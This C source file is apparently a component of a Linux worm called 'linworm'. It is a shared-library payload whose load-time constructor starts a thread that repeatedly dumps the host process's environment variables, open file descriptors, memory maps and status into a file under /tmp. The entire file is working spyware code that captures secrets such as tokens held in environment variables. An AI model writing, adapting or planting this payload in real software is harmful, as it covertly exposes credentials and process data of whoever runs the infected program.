#include "common.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>

#define PROCSPY_LOG        "/tmp/linworm_procspy.log"
#define PROCSPY_INTERVAL_MS 5000

static void dump_file_contents(const char *path, const char *label) {
    payload_log(PROCSPY_LOG, "--- %s ---", label);
    FILE *f = fopen(path, "r");
    if (!f) {
        payload_log(PROCSPY_LOG, "  (could not open %s)", path);
        return;
    }
    char line[512];
    while (fgets(line, sizeof(line), f)) {
        size_t len = strlen(line);
        if (len > 0 && line[len - 1] == '\n')
            line[len - 1] = '\0';
        payload_log(PROCSPY_LOG, "  %s", line);
    }
    fclose(f);
}

static void dump_fds(void) {
    payload_log(PROCSPY_LOG, "--- open file descriptors ---");
    DIR *d = opendir("/proc/self/fd");
    if (!d) {
        payload_log(PROCSPY_LOG, "  (could not open /proc/self/fd)");
        return;
    }
    struct dirent *ent;
    char link_path[280];
    char target[256];
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_name[0] == '.')
            continue;
        snprintf(link_path, sizeof(link_path), "/proc/self/fd/%s", ent->d_name);
        ssize_t len = readlink(link_path, target, sizeof(target) - 1);
        if (len > 0) {
            target[len] = '\0';
            payload_log(PROCSPY_LOG, "  fd %-4s -> %s", ent->d_name, target);
        }
    }
    closedir(d);
}

static void dump_environ(void) {
    payload_log(PROCSPY_LOG, "--- environment variables ---");
    FILE *f = fopen("/proc/self/environ", "r");
    if (!f) {
        payload_log(PROCSPY_LOG, "  (could not open /proc/self/environ)");
        return;
    }
    char buf[8192];
    size_t n = fread(buf, 1, sizeof(buf) - 1, f);
    buf[n] = '\0';
    fclose(f);

    const char *p = buf;
    while (p < buf + n) {
        if (*p)
            payload_log(PROCSPY_LOG, "  %s", p);
        p += strlen(p) + 1;
    }
}

static void take_snapshot(unsigned long tick) {
    payload_log(PROCSPY_LOG,
                "========== snapshot #%lu (pid=%d) ==========", tick, getpid());
    dump_fds();
    dump_environ();
    dump_file_contents("/proc/self/maps", "memory maps");
    dump_file_contents("/proc/self/status", "process status");
}

static void *procspy_thread(void *arg) {
    (void)arg;
    unsigned long tick = 0;

    payload_log(PROCSPY_LOG, "proc_spy started (pid=%d)", getpid());

    while (payload_running()) {
        take_snapshot(tick++);
        payload_sleep_ms(PROCSPY_INTERVAL_MS);
    }

    payload_log(PROCSPY_LOG, "proc_spy shutting down after %lu snapshots", tick);
    return NULL;
}

__attribute__((constructor))
void on_load(void) {
    if (payload_init() == 0)
        payload_start(procspy_thread);
}

__attribute__((destructor))
void on_unload(void) {
    if (g_pipe_fd[0] != -1)
        payload_stop();
}
